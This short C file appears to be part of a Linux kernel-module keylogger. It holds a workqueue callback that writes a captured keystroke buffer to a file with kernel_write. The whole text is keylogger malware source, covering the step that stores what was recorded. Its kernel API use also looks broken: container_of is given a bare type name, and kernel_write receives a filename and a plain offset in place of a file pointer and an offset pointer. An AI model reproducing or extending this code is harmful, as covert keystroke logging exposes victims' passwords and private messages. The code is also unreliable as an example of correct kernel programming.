#include "write_to_file.h"

void write_to_file(struct work_struct* work){
    struct KEYLOGGER* klogger;
    klogger=container_of(work,KEYLOGGER,work_struct);
    kernel_write(klogger->filename,klogger->write_buffer,BUFF_SIZE,klogger->offset_in_file);
}